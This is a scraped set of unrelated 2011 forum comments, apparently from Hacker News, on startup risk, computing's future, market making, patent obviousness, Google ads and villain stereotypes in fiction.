I mean the next 50 years of your life is utterly worthless, right?<p>Did you ever wonder why so many internet startups in the US are built by people in their 20's?  It comes down to a few reasons, but the primary reason is that very few people want to take a risk once they get into a lifestyle with kids, house payments, or private school.  People with health issues couldn't get health care coverage once it they left a company (the pre-existing condition clause), and others don't want to leave a career or reputation that took 20 years to build at the company they work for.<p>You're young, and presumably healthy.  You took one risk and failed.  Consider it an education more valuable than your schooling.  It's time to take another.  Figure out why the first failed and don't repeat the same mistakes.  Easier said then done, I know.  It's also true.  Why didn't hospitals buy your system?  Do you know?  Was the market locked up by a big data company?<p>Build something, start off small.

We've seen maybe 1% of the disruption that computers are going to cause.<p>Bitcoin was one of those ""holy shit"" moments for me, when I realized that we've only <i>begun</i> to see how computing is going to radically transform the shape of money.<p>Huge aspects of our lives remain largely unaffected by the invention of the computer, because actually applying the computer to our problems takes <i>decades</i>. It is a slow process of hacking out brittle solutions to niche problems, and then waiting as those solutions are slowly absorbed and molded to our culture, and then used widely enough that someone else can take the next tiny step.<p>Think about this: Medicine turns out to be a low hanging fruit as far as A.I. concerned, in that relatively simple statistical models can be valuable diagnostic tools. Doctors still operate the way they did 100 years ago... reading lots of books in medical school, and then looking in those books as they do their job.  Only now, in PubMed and the like, they've got a much bigger book and they can flip through it faster. AI hasn't even really poked over their horizon.<p>And that's an <i>easy</i> problem. The hard problems that computing will obliterate are a hundred years off.<p>We have yet to experience a single generation where every child had access to programming tools from birth.<p>We have no idea what is coming. But I am certain we will be seeing decade after decade of relentless innovation as this plays out.",1312259526

The net benefit to everybody is that the volatility is lower, as you moved the price down when it was too high and moved it up when it was too low.<p>The market efficiency is higher too: a lot less capital is required to establish fair prices as market reacts immediately to any imbalance.<p>It also makes the spread lower and makes buying and selling stock cheaper for your customers. Only a few years ago market makers and specialists would chicken out at the first sign of trouble and would widen the spread between bid and ask prices.

We can show that many of these hundreds of people have never heard of your patent, or any subsequent licensing of your patent, and implemented the patented idea themselves. Therefore, by virtue of this repeated and numerous recreation of your patented idea, it is clearly obvious.<p>Alas, hammering this into a legally rigorous argument would be quite a challenge, but in general the very idea that hundreds of people could be in violation of your patent without any sort of communication between themselves for the purposes of violating this patent, or any sort of trail back to the patent holder, shouldn't actually be possible.",1312258147

All your shortcuts will work exactly how you would expect them to (ctrl+a, I'm looking at you). You get a help menu with built in search of the menu bar (<a href=""http://cl.ly/8yKI"" rel=""nofollow"">http://cl.ly/8yKI</a>).

I don't see my job as ultimately selling ads.<p>If you look at things that way, you might as well take the argument to it's extreme.  Adwords doesn't actually make Google money, the payment processing system does.  Are the ads just a way to get folks to use our payment processing system?  Is search just a way to get folks to use our payment processing system?  I don't see it that way.<p>Instead, I see my job as creating a search engine.  I create a tool that helps people learn more about the world around them, more quickly and efficiently than they would have otherwise.  For most queries, ads aren't even displayed.  Making money is one way to bring more resources to that problem.  So ads are a way to drive improvements in search rather than search being a way to drive eyeballs to ads.  Often, the ads are a useful service in their own right which is an amazingly lucky opportunity.",1312257724

Sometimes being downright evil without much reason (because they actually enjoy it or whatever), and they mostly don't have real '3D' characters but are a plot device for violence and other uncivilized actions. They're so cookie cutter that you could see any number of them killed without really feeling anything.<p>On the other side, you have the Northern European bunch, some of whom can be quite evil too, but usually for complex geopolitical reasons or other more human motivations. In other words, they don't do evil things just for fun or because they don't know better, but because they think they're actually doing the right thing, somehow. Their characters are usually much more developed.<p>Maybe it's just like this because of the way our evolved brains work, and the target audience can't help but identify with a certain 'tribe'.
